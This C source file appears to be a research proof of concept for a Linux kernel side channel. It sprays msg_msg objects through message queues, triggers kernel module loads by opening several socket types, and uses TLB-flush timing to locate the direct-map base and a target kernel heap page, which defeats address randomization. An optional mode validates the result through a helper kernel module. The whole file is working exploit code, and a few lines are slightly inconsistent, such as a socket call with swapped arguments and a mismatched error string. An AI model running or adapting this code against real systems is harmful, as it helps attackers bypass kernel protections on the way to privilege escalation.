#include "utils.h"
#include "tlb_flush.h"
#include "msg_msg.h"
#include "coarse_grain_leak.h"
#define VALIDATE
#ifdef VALIDATE
#include "ulkm.h"
#endif
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/mman.h>
#define IPPROTO_DCCP 33
#define IPPROTO_SCTP 132
#define IPPROTO_L2TP 115
#define CAN_RAW 1
#define CAN_BCM 2
#define CAN_ISOTP 6

#define OBJS_PER_SLAB 32
#define MSGS (OBJS_PER_SLAB*50)
#define MSG_SPRAYS (OBJS_PER_SLAB*200)
#define MSG_TYPE 0x41
#define MSG_SIZE (128 - 48)

int qids_spray[MSG_SPRAYS];
int qids[MSGS];

#define TRIES 40

void get_times(int qid, size_t type, size_t addr, size_t tries, size_t *time, size_t *time_n2, size_t *time_n4)
{
    static char buffer[0x1000] = {0};
    msg *message = (msg *)buffer;
    message->mtype = type;

    size_t times[tries];
    size_t times_n2[tries];
    size_t times_n4[tries];
    for (size_t i = 0; i < tries; ++i) {
        flush_tlb_targeted_4k(addr);
        flush_tlb_targeted_4k(addr+2*(1<<12));
        flush_tlb_targeted_4k(addr+2*(1<<12));
        get_msg(qid, message, MSG_SIZE, 0, MSG_COPY|IPC_NOWAIT);
        times[i] = onlyreload(addr);
        times_n2[i] = onlyreload(addr+2*(1<<12));
        times_n4[i] = onlyreload(addr+4*(1<<12));
    }
    qsort(times, tries, sizeof(size_t), comp);
    qsort(times_n2, tries, sizeof(size_t), comp);
    qsort(times_n4, tries, sizeof(size_t), comp);
    *time = times[tries/4];
    *time_n2 = times_n2[tries/4];
    *time_n4 = times_n4[tries/4];
}
int is_2mb(int qid, size_t type, size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(qid, type, addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && time_n2 < THRESHOLD && time_n4 < THRESHOLD);
}
int hit_flush(int qid, size_t type, size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(qid, type, addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && (time_n2 > THRESHOLD || time_n4 > THRESHOLD));
}

int main(void)
{
    printf("[*] start\n");
    set_limit();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    pin_to_core(0);

    init_tlb_flush();
    get_total_memory();

    static char buffer[0x1000] = {0};
    msg *message = (msg *)buffer;
    message->mtype = MSG_TYPE;

    printf("[*] make queues\n");
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        qids_spray[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    for (size_t i = 0; i < MSGS; ++i)
        qids[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    size_t time;
    size_t prev_time = -1;
    size_t last_slab = -1;
    printf("[*] alloc msg_msg structs\n");
    for (size_t i = 0; i < MSG_SPRAYS/2; ++i)
        send_msg(qids_spray[i], message, MSG_SIZE, 0);

    printf("[*] load 1st half of kernel modules\n");
    int sock_fd;
    sock_fd = socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP);
    if (sock_fd < 0) {
        perror("socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP)");
        exit(-1);
    }
    sock_fd = socket(SOCK_DGRAM, CAN_BCM, 0);
    if (sock_fd < 0) {
        perror("socket(SOCK_DGRAM, CAN_BCM, 0)");
        exit(-1);
    }
    sock_fd = socket(AF_VSOCK, SOCK_STREAM, 0);
    if (sock_fd < 0) {
        perror("socket(AF_VSOCK, SOCK_STREAM, 0)");
        exit(-1);
    }

    printf("[*] alloc msg_msg structs\n");
    for (size_t i = MSG_SPRAYS/2; i < MSG_SPRAYS; ++i) {
        size_t t0 = rdtsc_begin();
        send_msg(qids_spray[i], message, MSG_SIZE, 0);
        size_t t1 = rdtsc_end();
        time = t1-t0;
        if (time > (prev_time+1000)) {
            if (last_slab == (size_t)-1)
                last_slab = i;
            else if (i - last_slab == OBJS_PER_SLAB)
                break;
            else 
                last_slab = -1;
        }
        prev_time = time;
    }
    for (size_t i = 0; i < MSGS; ++i)
        send_msg(qids[i], message, MSG_SIZE, 0);

    printf("[*] load 2nd half of kernel modules\n");
    sock_fd = socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP);
    if (sock_fd < 0) {
        perror("socket(AF_CAN, SOCK_DGRAM, CAN_ISOTP");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP)");
        exit(-1);
    }
    sock_fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_L2TP);
    if (sock_fd < 0) {
        perror("socket(PF_INET, SOCK_STREAM, IPPROTO_L2TP)");
        exit(-1);
    }

    __attribute__((unused))size_t found_addresses[32];
    size_t found_addresses_index = 0;

#ifdef VALIDATE
    lkm_init();
    size_t msg_msg_0;
    size_t msg_msg_1;
    size_t msg_msg_2;
    size_t msg_msg_3;
    size_t msg_msg_29;
    size_t msg_msg_30;
    size_t msg_msg_128;
    lkm_msg_msg_leak((size_t)&msg_msg_0, qids[0], MSG_TYPE);
    lkm_msg_msg_leak((size_t)&msg_msg_1, qids[1], MSG_TYPE);
    lkm_msg_msg_leak((size_t)&msg_msg_2, qids[2], MSG_TYPE);
    lkm_msg_msg_leak((size_t)&msg_msg_3, qids[3], MSG_TYPE);
    lkm_msg_msg_leak((size_t)&msg_msg_29, qids[29], MSG_TYPE);
    lkm_msg_msg_leak((size_t)&msg_msg_30, qids[30], MSG_TYPE);
    lkm_msg_msg_leak((size_t)&msg_msg_128, qids[128], MSG_TYPE);
    printf("[*] leak msg_msg struct 0   %016zx\n", msg_msg_0);
    printf("[*] leak msg_msg struct 1   %016zx\n", msg_msg_1);
    printf("[*] leak msg_msg struct 2   %016zx\n", msg_msg_2);
    printf("[*] leak msg_msg struct 3   %016zx\n", msg_msg_3);
    printf("[*] leak msg_msg struct 29  %016zx\n", msg_msg_29);
    printf("[*] leak msg_msg struct 30  %016zx\n", msg_msg_30);
    printf("[*] leak msg_msg struct 128 %016zx\n", msg_msg_128);

    size_t is_4kb = lkm_is_4kb(msg_msg_0);
    printf("[*] %016zx is %s page\n", msg_msg_0, is_4kb ? "4kB" : "2MB");
#endif

    size_t dpm_base = dpm_leak(TRIES);
    printf("[*] dpm_base: %016zx\n", dpm_base);
    for (size_t addr = dpm_base; addr < dpm_base+mem_total_rounded; addr += (1<<21)) {
        if ((addr % (1 << 30)) == 0)
            printf("[*] addr %016zx\n", addr);

        if (is_2mb(qids[0], MSG_TYPE, addr, 40))
            continue;
        for (size_t i = 0; i < (1ULL << 21); i += (1ULL << 12)) {
            size_t cur_addr = addr + i;
            size_t found_0 = hit_flush(qids[0], MSG_TYPE, cur_addr, TRIES);
            if (!found_0)
                continue;

            size_t found_32 = hit_flush(qids[32], MSG_TYPE, cur_addr, TRIES);
            if (found_32)
                continue;
            size_t found_64 = hit_flush(qids[64], MSG_TYPE, cur_addr, TRIES);
            if (found_64)
                continue;
            size_t found_96 = hit_flush(qids[96], MSG_TYPE, cur_addr, TRIES);
            if (found_96)
                continue;
            size_t found_128 = hit_flush(qids[128], MSG_TYPE, cur_addr, TRIES);
            if (found_128)
                continue;
            size_t found_160 = hit_flush(qids[160], MSG_TYPE, cur_addr, TRIES);
            if (found_160)
                continue;

            size_t found_1 = hit_flush(qids[1], MSG_TYPE, cur_addr, TRIES);
            if (!found_1)
                continue;
            size_t found_2 = hit_flush(qids[2], MSG_TYPE, cur_addr, TRIES);
            if (!found_2)
                continue;
            size_t found_3 = hit_flush(qids[3], MSG_TYPE, cur_addr, TRIES);
            if (!found_3)
                continue;
            size_t found_16 = hit_flush(qids[16], MSG_TYPE, cur_addr, TRIES);
            if (!found_16)
                continue;
            size_t found_29 = hit_flush(qids[29], MSG_TYPE, cur_addr, TRIES);
            if (!found_29)
                continue;
            size_t found_30 = hit_flush(qids[30], MSG_TYPE, cur_addr, TRIES);
            if (!found_30)
                continue;
            
            found_addresses[found_addresses_index++] = cur_addr;
            printf("[+] found addr %016zx\n", cur_addr);
        }
    }

    for (size_t i = 0; i < MSGS; ++i)
        cleanup_queue(qids[i]);
    for (size_t i = 0; i < MSG_SPRAYS; ++i)
        cleanup_queue(qids_spray[i]);
    if (found_addresses_index == 0)
        printf("[*] non found -> retry\n");
    else if (found_addresses_index != 1)
        printf("[*] multiple addresses -> retry\n");
#ifdef VALIDATE
    else if (found_addresses[0] == (msg_msg_0 & ~((1<<12)-1)))
        printf("[+] success\n");
    else
        printf("[!] fail\n");
#else
    else
        printf("[*] found %016zx\n", found_addresses[0]);
#endif
}